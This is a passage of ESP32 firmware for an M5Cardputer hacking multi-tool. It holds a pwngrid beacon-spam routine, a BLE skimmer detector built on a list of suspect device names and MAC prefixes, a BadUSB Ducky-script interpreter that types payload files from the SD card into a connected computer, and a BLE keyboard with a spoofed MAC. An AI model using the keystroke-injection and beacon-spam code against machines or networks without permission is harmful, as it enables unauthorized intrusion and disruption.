      String names_line = line.substring(6);
      names_line.replace("\"", "");  // Remove quotes
      names_line.trim();  // Remove leading/trailing whitespace
      int start = 0;
      int end = names_line.indexOf(',', start);
      num_names = 0;
      while (end != -1) {
        names[num_names++] = strdup(names_line.substring(start, end).c_str());
        start = end + 1;
        end = names_line.indexOf(',', start);
      }
      names[num_names++] = strdup(names_line.substring(start).c_str());
    }
  }
  file.close();
}

extern "C" void send_pwnagotchi_beacon_main() {
  // Initialiser NVS
  esp_err_t ret = nvs_flash_init();
  if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
    ESP_ERROR_CHECK(nvs_flash_erase());
    ret = nvs_flash_init();
  }
  ESP_ERROR_CHECK(ret);

  // Initialiser la configuration Wi-Fi
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  ESP_ERROR_CHECK(esp_wifi_init(&cfg));
  ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
  ESP_ERROR_CHECK(esp_wifi_start());

  // Load faces and names from the file
  loadFacesAndNames();

  // Set the spamRunning flag to true
  spamRunning = true;

  // CrÃ©er la tÃ¢che beacon
  xTaskCreate(&beacon_task, "beacon_task", 4096, NULL, 5, NULL);

  // Display the spam status and wait for user input
  displaySpamStatus();
}

// pwngridspam end




/*
============================================================================================================================
// detectskimmer 
============================================================================================================================
*/
BLEScan* pBLEScan;
bool isScanning = false;
bool skimmerDetected = false;
bool isBLEScanning = false;
String skimmerInfo;

const char* badDeviceNames[] = {"HC-03", "HC-05", "HC-06", "HC-08", "BT04-A", "BT05"};
const int badDeviceNamesCount = sizeof(badDeviceNames) / sizeof(badDeviceNames[0]);

const char* badMacPrefixes[] = {"00:11:22", "00:18:E4", "20:16:04"};
const int badMacPrefixesCount = sizeof(badMacPrefixes) / sizeof(badMacPrefixes[0]);

unsigned long lastUpdate = 0;
const unsigned long refreshInterval = 500;

class SkimmerAdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
public:
  void onResult(BLEAdvertisedDevice advertisedDevice) override {
    bool isSkimmerDetected = false;
    String displayMessage;

    std::string deviceAddress = advertisedDevice.getAddress().toString();
    std::string deviceName = advertisedDevice.getName();
    int rssi = advertisedDevice.getRSSI();

    for (int i = 0; i < badDeviceNamesCount; i++) {
      if (deviceName == badDeviceNames[i]) {
        isSkimmerDetected = true;
        break;
      }
    }

    for (int i = 0; i < badMacPrefixesCount && !isSkimmerDetected; i++) {
      if (deviceAddress.substr(0, 8) == badMacPrefixes[i]) {
        isSkimmerDetected = true;
        break;
      }
    }

    displayMessage = "___________________\n\n";
    displayMessage += "Device: \n";
    displayMessage += deviceName.length() != 0 ? deviceName.c_str() : deviceAddress.c_str();
    displayMessage += "\n\n";
    displayMessage += "RSSI: " + String(rssi) + "\n";
    displayMessage += "Skimmer: " + String(isSkimmerDetected ? "Probable" : "No");
    displayMessage += "\n___________________";

    Serial.println(displayMessage);

    unsigned long currentTime = millis();
    if (currentTime - lastUpdate >= refreshInterval) {
      lastUpdate = currentTime;
      M5.Display.fillScreen(TFT_BLACK);
      M5.Display.setTextSize(2);
      M5.Display.setCursor(5, 5);
      M5.Display.setTextColor(isSkimmerDetected ? TFT_RED : menuTextUnFocusedColor);
      M5.Display.println(displayMessage);
    }

    if (isSkimmerDetected && !skimmerDetected) {
      skimmerDetected = true;
      skimmerInfo = displayMessage;
    }
  }
};

void skimmerDetection() {
  if (!BLEDevice::getInitialized()) {
    BLEDevice::init("");
  }

  if (pBLEScan != nullptr) {
    if (isBLEScanning) {
      pBLEScan->stop();
      isBLEScanning = false;
    }
    pBLEScan->clearResults();
  }

  pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new SkimmerAdvertisedDeviceCallbacks());
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(1349);
  pBLEScan->setWindow(449);

  M5.Display.fillScreen(menuBackgroundColor);
  M5.Display.setTextSize(2);
  M5.Display.setTextColor(menuTextUnFocusedColor);
  M5.Display.setCursor(5, 5);
  M5.Display.println("Scanning for Skimmers...");

  isScanning = true;
  skimmerDetected = false;
  skimmerInfo = "";

  pBLEScan->start(0, nullptr, false);
  isBLEScanning = true;
  enterDebounce();
  while (isScanning) {
    M5.update();
    M5Cardputer.update();

    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
      if (pBLEScan != nullptr && isBLEScanning) {
        pBLEScan->stop();
        isBLEScanning = false;
      }
      isScanning = false;
      waitAndReturnToMenu("Scan Stopped");
      return;
    }

    if (skimmerDetected) {
      if (pBLEScan != nullptr && isBLEScanning) {
        pBLEScan->stop();
        isBLEScanning = false;
      }
      isScanning = false;

      M5.Display.fillScreen(TFT_BLACK);
      M5.Display.setTextSize(2);
      M5.Display.setCursor(5, 5);
      M5.Display.setTextColor(TFT_RED);
      M5.Display.println(skimmerInfo);
      M5.Speaker.tone(1000, 500);
      while (true) {
        M5.update();
        M5Cardputer.update();
        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
          waitAndReturnToMenu("Skimmer Detected - Caution");
          releaseBLE();
          return;
        }
        delay(100);
      }
    }
    delay(100);
  }
}


// detectskimmer end 

/*
============================================================================================================================
// badusb 
//from https://github.com/pr3y/bruce and refactored
============================================================================================================================
*/
void key_input(FS &fs, const String &bad_script) {
  if (fs.exists(bad_script) && !bad_script.isEmpty()) {
    File payloadFile = fs.open(bad_script, "r");
    if (payloadFile) {
      M5.Display.setCursor(5, 40);
      M5.Display.println("from file!");
      String lineContent = "";
      String Command = "";
      char Cmd[15];
      String Argument = "";
      String RepeatTmp = "";
      char ArgChar;
      bool ArgIsCmd;  // VÃ©rifie si l'argument est DELETE, TAB ou F1-F12
      int cmdFail;    // VÃ©rifie si la commande est supportÃ©e
      int line;       // Montre 3 commandes du payload sur l'Ã©cran

      Kb.releaseAll();
      M5.Display.setTextSize(1);
      M5.Display.setCursor(5, 5);
      M5.Display.fillScreen(menuBackgroundColor);
      line = 0;

      while (payloadFile.available()) {
        lineContent = payloadFile.readStringUntil('\n');
        if (lineContent.endsWith("\r")) lineContent.remove(lineContent.length() - 1);

        ArgIsCmd = false;
        cmdFail = 0;
        RepeatTmp = lineContent.substring(0, lineContent.indexOf(' '));
        RepeatTmp = RepeatTmp.c_str();
        if (RepeatTmp == "REPEAT") {
          if (lineContent.indexOf(' ') > 0) {
            RepeatTmp = lineContent.substring(lineContent.indexOf(' ') + 1);
            if (RepeatTmp.toInt() == 0) {
              RepeatTmp = "1";
              M5.Display.setTextColor(TFT_RED);
              M5.Display.println("REPEAT argument NaN, repeating once");
            }
          } else {
            RepeatTmp = "1";
            M5.Display.setTextColor(TFT_RED);
            M5.Display.println("REPEAT without argument, repeating once");
          }
        } else {
          Command = lineContent.substring(0, lineContent.indexOf(' '));
          strcpy(Cmd, Command.c_str());
          Argument = lineContent.substring(lineContent.indexOf(' ') + 1);
          RepeatTmp = "1";
        }
        uint16_t i;
        for (i = 0; i < RepeatTmp.toInt(); i++) {
          char OldCmd[15];
          Argument = Argument.c_str();
          ArgChar = Argument.charAt(0);

          if (Argument == "F1" || Argument == "F2" || Argument == "F3" || Argument == "F4" || 
              Argument == "F5" || Argument == "F6" || Argument == "F7" || Argument == "F8" || 
              Argument == "F9" || Argument == "F10" || Argument == "F11" || Argument == "F12" || 
              Argument == "DELETE" || Argument == "TAB" || Argument == "ENTER") { 
            ArgIsCmd = true; 
          }

          restart: // restart checks

          if (strcmp(Cmd, "REM") == 0)          { Serial.println(" // " + Argument); }                  else { cmdFail++; }
          if (strcmp(Cmd, "DELAY") == 0)        { delay(Argument.toInt()); }                            else { cmdFail++; }
          if (strcmp(Cmd, "DEFAULTDELAY") == 0 || strcmp(Cmd, "DEFAULT_DELAY") == 0) delay(DEF_DELAY);  else { cmdFail++; }  //100ms
          if (strcmp(Cmd, "STRING") == 0)       { Kb.print(Argument);}                                  else { cmdFail++; }
          if (strcmp(Cmd, "STRINGLN") == 0)     { Kb.println(Argument); }                               else { cmdFail++; }
          if (strcmp(Cmd, "SHIFT") == 0)        { Kb.press(KEY_LEFT_SHIFT);                                                         if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}  // Save Cmd into OldCmd and then set Cmd = Argument
          if (strcmp(Cmd, "ALT") == 0)          { Kb.press(KEY_LEFT_ALT);                                                           if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}  // This is made to turn the code faster and to recover
          if (strcmp(Cmd, "CTRL-ALT") == 0)     { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_CTRL);                                  if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}  // the Cmd after the if else statements, in order to
          if (strcmp(Cmd, "CTRL-SHIFT") == 0)   { Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_SHIFT);                                if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}// the Cmd REPEAT work as intended.
          if (strcmp(Cmd, "CTRL-GUI") == 0)     { Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_GUI);                                  if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "ALT-SHIFT") == 0)    { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_SHIFT);                                 if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "ALT-GUI") == 0)      { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_GUI);                                   if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "GUI-SHIFT") == 0)    { Kb.press(KEY_LEFT_GUI); Kb.press(KEY_LEFT_SHIFT);                                 if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "CTRL-ALT-SHIFT") == 0) { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_SHIFT);      if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "CTRL-ALT-GUI") == 0)   { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_GUI);        if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "ALT-SHIFT-GUI") == 0)  { Kb.press(KEY_LEFT_ALT); Kb.press(KEY_LEFT_SHIFT); Kb.press(KEY_LEFT_GUI);       if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "CTRL-SHIFT-GUI") == 0) { Kb.press(KEY_LEFT_CTRL); Kb.press(KEY_LEFT_SHIFT); Kb.press(KEY_LEFT_GUI);      if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "GUI") == 0 || strcmp(Cmd, "WINDOWS") == 0) { Kb.press(KEY_LEFT_GUI);                                     if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "CTRL") == 0 || strcmp(Cmd, "CONTROL") == 0) { Kb.press(KEY_LEFT_CTRL);                                   if (!ArgIsCmd) { Kb.press(ArgChar); Kb.releaseAll(); } else { strcpy(OldCmd, Cmd); strcpy(Cmd, Argument.c_str()); goto restart; }} else { cmdFail++;}
          if (strcmp(Cmd, "ESC") == 0 || strcmp(Cmd, "ESCAPE") == 0) {Kb.press(KEY_ESC);Kb.releaseAll(); } else { cmdFail++;}
          if (strcmp(Cmd, "ENTER") == 0)        { Kb.press(KEY_RETURN); Kb.releaseAll(); }    else { cmdFail++; }
          if (strcmp(Cmd, "DOWNARROW") == 0)    { Kb.press(KEY_DOWN_ARROW); Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "DOWN") == 0)         { Kb.press(KEY_DOWN_ARROW); Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "LEFTARROW") == 0)    { Kb.press(KEY_LEFT_ARROW); Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "LEFT") == 0)         { Kb.press(KEY_LEFT_ARROW); Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "RIGHTARROW") == 0)   { Kb.press(KEY_RIGHT_ARROW);Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "RIGHT") == 0)        { Kb.press(KEY_RIGHT_ARROW);Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "UPARROW") == 0)      { Kb.press(KEY_UP_ARROW);   Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "UP") == 0)           { Kb.press(KEY_UP_ARROW);   Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "BREAK") == 0)        { Kb.press(KEY_PAUSE);      Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "CAPSLOCK") == 0)     { Kb.press(KEY_CAPS_LOCK);  Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "PAUSE") == 0)        { Kb.press(KEY_PAUSE);      Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "BACKSPACE") == 0)    { Kb.press(KEY_BACKSPACE);   Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "END") == 0)          { Kb.press(KEY_END);        Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "HOME") == 0)         { Kb.press(KEY_HOME);       Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "INSERT") == 0)       { Kb.press(KEY_INSERT);     Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "NUMLOCK") == 0)      { Kb.press(LED_NUMLOCK);    Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "PAGEUP") == 0)       { Kb.press(KEY_PAGE_UP);    Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "PAGEDOWN") == 0)     { Kb.press(KEY_PAGE_DOWN);  Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "PRINTSCREEN") == 0)  { Kb.press(KEY_PRINT_SCREEN);Kb.releaseAll();}else { cmdFail++;}
          if (strcmp(Cmd, "SCROLLOCK") == 0)    { Kb.press(KEY_SCROLL_LOCK);Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "MENU") == 0)         { Kb.press(KEY_MENU);       Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F1") == 0)           { Kb.press(KEY_F1);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F2") == 0)           { Kb.press(KEY_F2);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F3") == 0)           { Kb.press(KEY_F3);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F4") == 0)           { Kb.press(KEY_F4);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F5") == 0)           { Kb.press(KEY_F5);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F6") == 0)           { Kb.press(KEY_F6);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F7") == 0)           { Kb.press(KEY_F7);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F8") == 0)           { Kb.press(KEY_F8);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F9") == 0)           { Kb.press(KEY_F9);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F10") == 0)          { Kb.press(KEY_F10);        Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F11") == 0)          { Kb.press(KEY_F11);        Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "F12") == 0)          { Kb.press(KEY_F12);        Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "TAB") == 0)          { Kb.press(KEY_TAB);         Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "DELETE") == 0)       { Kb.press(KEY_DELETE);     Kb.releaseAll();} else { cmdFail++;}
          if (strcmp(Cmd, "SPACE") ==0)         { Kb.press(KEY_SPACE);      Kb.releaseAll();} else { cmdFail++;}

          if (ArgIsCmd) strcpy(Cmd, OldCmd);  // Recover the command to run in case of REPEAT

          Kb.releaseAll();

          if (line == 7) {
            M5.Display.setCursor(5, 5);
            M5.Display.fillScreen(menuBackgroundColor);
            line = 0;
          }
          line++;

          if (cmdFail == 57) {
            M5.Display.setTextColor(TFT_RED);
            M5.Display.print(Command);
            M5.Display.println(" -> Not Supported, running as STRINGLN");
            if (Command != Argument) {
              Kb.print(Command);
              Kb.print(" ");
              Kb.println(Argument);
            } else {
              Kb.println(Command);
            }
          } else {
            M5.Display.setTextColor(menuBackgroundColor);
            M5.Display.println(Command);
          }
          M5.Display.setTextColor(menuTextUnFocusedColor);
          M5.Display.println(Argument);

          if (strcmp(Cmd, "REM") != 0) delay(DEF_DELAY);  //if command is not a comment, wait DEF_DELAY until next command (100ms)
        }
      }
      M5.Display.setTextSize(1.5);
      payloadFile.close();
      Serial.println(F("Finished badusb payload execution..."));
    }
  } 
  delay(1000);
  Kb.releaseAll();
}


void chooseKb(const uint8_t *layout) {
    kbChosen = true;
    Kb.begin(layout);  // Initialise le clavier avec la disposition choisie
    USB.begin();       // S'assure que l'USB est initialisÃ© aprÃ¨s le choix du clavier
}


void showKeyboardLayoutOptions() {
    std::vector<std::pair<String, std::function<void()>>> keyboardOptions = {
        {"US Inter",    [=]() { chooseKb(KeyboardLayout_en_US); }},
        {"PT-BR ABNT2", [=]() { chooseKb(KeyboardLayout_pt_BR); }},
        {"PT-Portugal", [=]() { chooseKb(KeyboardLayout_pt_PT); }},
        {"AZERTY FR",   [=]() { chooseKb(KeyboardLayout_fr_FR); }},
        {"es-Espanol",  [=]() { chooseKb(KeyboardLayout_es_ES); }},
        {"it-Italiano", [=]() { chooseKb(KeyboardLayout_it_IT); }},
        {"en-UK",       [=]() { chooseKb(KeyboardLayout_en_UK); }},
        {"de-DE",       [=]() { chooseKb(KeyboardLayout_de_DE); }},
        {"sv-SE",       [=]() { chooseKb(KeyboardLayout_sv_SE); }},
        {"da-DK",       [=]() { chooseKb(KeyboardLayout_da_DK); }},
        {"hu-HU",       [=]() { chooseKb(KeyboardLayout_hu_HU); }},
    };
    loopOptions(keyboardOptions, false, true, "Keyboard Layout");

    if (!kbChosen) {
        Kb.begin(KeyboardLayout_fr_FR); // Commencer avec la disposition par dÃ©faut si rien n'est choisi
    }
}

// Variable globale pour stocker le nom du script sÃ©lectionnÃ©
String selectedScriptName = "";

void showScriptOptions() {
    File root = SD.open("/evil/BadUsbScript");
    std::vector<std::pair<String, std::function<void()>>> scriptOptions;

    while (true) {
        File entry = root.openNextFile();
        if (!entry) break;
        if (!entry.isDirectory()) {
            String filename = entry.name();
            selectedScriptName = filename;
            scriptOptions.push_back({filename, [=]() { runScript(filename); }});
        }
        entry.close();
    }

    if (scriptOptions.empty()) {
        // Affichez un message Ã  l'utilisateur ou exÃ©cutez une action par dÃ©faut
        Serial.println(F("Aucun script disponible."));
        M5.Display.println("Aucun script disponible.");
        // Vous pouvez aussi exÃ©cuter une fonction par dÃ©faut ici, si nÃ©cessaire
    } else {
        loopOptions(scriptOptions, false, true, "Choose Script");
    }

    // Quand un script est choisi, exÃ©cuter sa fonction
}


void runScript(const String &scriptName) {
    M5.Display.fillScreen(menuBackgroundColor);
    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
    M5.Display.println("Preparing");
    delay(200);

    String bad_script = "/evil/BadUsbScript/" + scriptName;
    FS &fs = SD;
    if (!kbChosen) {
        chooseKb(KeyboardLayout_fr_FR);// Commencer avec la disposition par dÃ©faut si rien n'est choisi
    }
    key_input(fs, bad_script);

    M5.Display.println("Payload Sent");
    delay(1000);
}

void badUSB() {
    Serial.println(F("BadUSB begin"));
    M5.Display.fillScreen(menuBackgroundColor);
    std::vector<std::pair<String, std::function<void()>>> mainOptions = {
        {"Script on SD", []() { showScriptOptions(); }},
        {"Keyboard Layout", []() { showKeyboardLayoutOptions(); showScriptOptions();}}
    };

    loopOptions(mainOptions, false, true, "Main Menu");

    // Attendre que l'utilisateur appuie sur "EntrÃ©e" ou "Retour arriÃ¨re"
    while (!M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && !M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        // Boucle jusqu'Ã  ce qu'une touche soit pressÃ©e
    }
    
    Serial.begin(115200);
    waitAndReturnToMenu("Return to menu");
}

// badusb end

/*
============================================================================================================================
// ble keyboard
============================================================================================================================
*/
// Map de rapport HID pour le clavier
const uint8_t HID_REPORT_MAP[] = {
    0x05, 0x01,  // Usage Pg (Generic Desktop)
    0x09, 0x06,  // Usage (Keyboard)
    0xA1, 0x01,  // Collection: (Application)
    0x85, 0x01,  // Report Id (1)
    0x05, 0x07,  //   Usage Pg (Key Codes)
    0x19, 0xE0,  //   Usage Min (224)
    0x29, 0xE7,  //   Usage Max (231)
    0x15, 0x00,  //   Log Min (0)
    0x25, 0x01,  //   Log Max (1)
    0x75, 0x01,  //   Report Size (1)
    0x95, 0x08,  //   Report Count (8)
    0x81, 0x02,  //   Input: (Data, Variable, Absolute)
    0x95, 0x01,  //   Report Count (1)
    0x75, 0x08,  //   Report Size (8)
    0x81, 0x01,  //   Input: (Constant)
    0x95, 0x05,  //   Report Count (5)
    0x75, 0x01,  //   Report Size (1)
    0x05, 0x08,  //   Usage Pg (LEDs)
    0x19, 0x01,  //   Usage Min (1)
    0x29, 0x05,  //   Usage Max (5)
    0x91, 0x02,  //   Output: (Data, Variable, Absolute)
    0x95, 0x01,  //   Report Count (1)
    0x75, 0x03,  //   Report Size (3)
    0x91, 0x01,  //   Output: (Constant)
    0x95, 0x06,  // Report Count (6)
    0x75, 0x08,  // Report Size (8)
    0x15, 0x00,  // Log Min (0)
    0x25, 0xF1,  // Log Max (241)
    0x05, 0x07,  // Usage Pg (Key Codes)
    0x19, 0x00,  // Usage Min (0)
    0x29, 0xf1,  // Usage Max (241)
    0x81, 0x00,  // Input: (Data, Array)
    0xC0         // End Collection
};

// Classe pour les callbacks du serveur BLE
class MyBLEServerCallbacks : public BLEServerCallbacks {
    void onConnect(BLEServer* pServer) override {
        Serial.println(F("Client connected to BLE server."));
        isConnected = true;
        updateBluetoothStatus(isConnected);
    }

    void onDisconnect(BLEServer* pServer) override {
        Serial.println(F("Client disconnected from BLE server."));
        isConnected = false;
        updateBluetoothStatus(isConnected);
        cleanupBluetooth(); // Nettoyer le Bluetooth et retourner au menu
    }
};
// Function to generate a random MAC address
void generateRandomMacAddress(uint8_t* macAddr) {
    for (int i = 0; i < 6; i++) {
        macAddr[i] = random(0, 256);  // Random byte for each part of the MAC
    }
    macAddr[0] = (macAddr[0] & 0xFC) | 0x02;  // Ensure it is a locally administered address (LAA)
}

// Fonction pour initialiser le clavier Bluetooth
void initBluetoothKeyboard() {
    cleanupBluetooth();

    // Generate a random MAC address
    uint8_t newMacAddr[6];
    generateRandomMacAddress(newMacAddr);

    // Set the new MAC address
    esp_base_mac_addr_set(newMacAddr);

    // Print the new MAC address
    Serial.print(F("New MAC address set: "));
    for (int i = 0; i < 6; i++) {
        Serial.printf("%02X", newMacAddr[i]);
        if (i < 5) Serial.print(F(":"));
    }
    Serial.println();

    M5Cardputer.Display.clear();
    M5Cardputer.Display.setTextColor(menuTextUnFocusedColor);
    M5Cardputer.Display.setCursor(0, 10);
    M5Cardputer.Display.println("Bluetooth device name :");
    
    String deviceName = getUserInput(); // Demander Ã  l'utilisateur le nom de l'appareil Bluetooth
    Serial.println("Bluetooth device name selected: " + deviceName);

    // Initialisation Bluetooth avec le nom fourni par l'utilisateur
    BLEDevice::init(deviceName.c_str());
    Serial.println("Bluetooth device initialized with name: " + deviceName);
    
    BLEServer *pServer = BLEDevice::createServer();
    pServer->setCallbacks(new MyBLEServerCallbacks());
    Serial.println(F("BLE server created and callbacks configured."));
    
    hid = new BLEHIDDevice(pServer);
    keyboardInput = hid->inputReport(1); // Utilisation de l'ID de rapport 1
    hid->manufacturer()->setValue("Espressif");
    hid->pnp(0x02, 0x045e, 0x028e, 0x0110);
    hid->hidInfo(0x00, 0x01);
    hid->reportMap((uint8_t*)HID_REPORT_MAP, sizeof(HID_REPORT_MAP));
    hid->startServices();
    Serial.println(F("HID services started."));

    BLEAdvertising *pAdvertising = pServer->getAdvertising();
    pAdvertising->setAppearance(HID_KEYBOARD);
    pAdvertising->addServiceUUID(hid->hidService()->getUUID());
    pAdvertising->start();
    Serial.println(F("BLE advertising started."));

    BLESecurity *pSecurity = new BLESecurity();
    pSecurity->setAuthenticationMode(ESP_LE_AUTH_BOND);
    pSecurity->setCapability(ESP_IO_CAP_NONE);
    pSecurity->setInitEncryptionKey(ESP_BLE_ENC_KEY_MASK | ESP_BLE_ID_KEY_MASK);
    Serial.println(F("BLE security configured."));

    isBluetoothKeyboardActive = true;
    Serial.println(F("Bluetooth keyboard mode activated."));
    
    // Affichage de l'Ã©tat d'attente
    displayWaitingForConnection(deviceName);

    // Boucle principale pour la gestion du clavier Bluetooth
    while (isBluetoothKeyboardActive) {
        keyboardLoop();
    }

    // Retour au menu principal aprÃ¨s la dÃ©sactivation
    waitAndReturnToMenu("Connection stopped");
}

// Fonction pour nettoyer et dÃ©sactiver le Bluetooth
void cleanupBluetooth() {
    if (isBluetoothKeyboardActive) {
        Serial.println(F("Disabling Bluetooth..."));

        BLEDevice::deinit();  // DÃ©sactiver toutes les activitÃ©s Bluetooth
        isBluetoothKeyboardActive = false;  // DÃ©sactiver le mode clavier Bluetooth
        Serial.println(F("Bluetooth disabled."));
    }
}

// Fonction d'affichage de l'attente de connexion
void displayWaitingForConnection(String deviceName) {
    M5Cardputer.Display.clear();
    M5Cardputer.Display.setTextColor(TFT_BLUE);
    M5Cardputer.Display.setCursor(0, 10);
    M5Cardputer.Display.println("Waiting on: " + deviceName);
    
    M5Cardputer.Display.setTextSize(3);
    const char* text = "Waiting";
    int16_t textWidth = M5Cardputer.Display.textWidth(text);
    int16_t textHeight = M5Cardputer.Display.fontHeight();
    int rectWidth = textWidth + 20;
    int rectHeight = textHeight + 20;
    int rectX = (240 - rectWidth) / 2;
    int rectY = (135 - rectHeight) / 2;
    M5Cardputer.Display.drawRoundRect(rectX, rectY, rectWidth, rectHeight, 10, TFT_BLUE);
    M5Cardputer.Display.setTextColor(TFT_BLUE);
    int textX = rectX + (rectWidth - textWidth) / 2;
    int textY = rectY + (rectHeight - textHeight) / 2;
    M5Cardputer.Display.setCursor(textX, textY);
    M5Cardputer.Display.print(text);
}

// Fonction de gestion des entrÃ©es du clavier
void handleKeyboardInput() {
    if (isConnected && isBluetoothKeyboardActive) {
        uint8_t modifier = 0;
        uint8_t keycode[6] = {0};

        if (M5Cardputer.Keyboard.isPressed()) {
            Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();
            int count = 0;
            for (auto i : status.hid_keys) {
                keycode[count] = i;
                count++;
            }

            if (status.ctrl) modifier |= 0x01;
            if (status.shift) modifier |= 0x02;
            if (status.alt) modifier |= 0x04;

            uint8_t report[8] = {modifier, 0, keycode[0], keycode[1], keycode[2], keycode[3], keycode[4], keycode[5]};
            keyboardInput->setValue(report, sizeof(report));
            keyboardInput->notify();
            delay(50);
            
            // VÃ©rifie si Ctrl et Backspace sont enfoncÃ©s simultanÃ©ment
            if (status.ctrl && status.space) {
                Serial.println(F("Ctrl + space detected. Returning to menu."));
                cleanupBluetooth(); // DÃ©connexion et nettoyage du Bluetooth
                return; // Quitte la fonction pour Ã©viter d'autres traitements
            }
        } else {
            uint8_t emptyKeyboardReport[8] = {0, 0, 0, 0, 0, 0, 0, 0};
            keyboardInput->setValue(emptyKeyboardReport, sizeof(emptyKeyboardReport));
            keyboardInput->notify();
        }
    }
}

// Boucle principale pour le clavier Bluetooth
void keyboardLoop() {
    M5Cardputer.update();
    handleKeyboardInput();
    delay(10);
}

